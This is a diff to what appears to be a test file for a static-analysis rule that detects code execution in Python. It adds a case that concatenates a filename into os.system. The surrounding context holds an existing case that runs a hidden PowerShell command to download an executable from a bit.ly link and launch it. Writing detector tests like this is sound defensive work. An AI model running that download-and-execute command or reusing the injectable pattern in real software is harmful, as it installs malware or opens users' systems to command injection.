@@ -140,6 +140,9 @@ subprocess.check_output(["git", "describe", "--tags"]).strip()
 """ RULEID: executing bash commands 
 """
 # ruleid: code-execution
+os.system('start ' + filename)
+
+# ruleid: code-execution
 os.system(
     "powershell -window hidden -executionpolicy bypass (New-object system.net.webclient).DownloadFile('http://bit.ly/2myCV9n',$env:APPDATA+'\Main.exe'); Start-Process $env:APPDATA'\Main.exe'"
 )
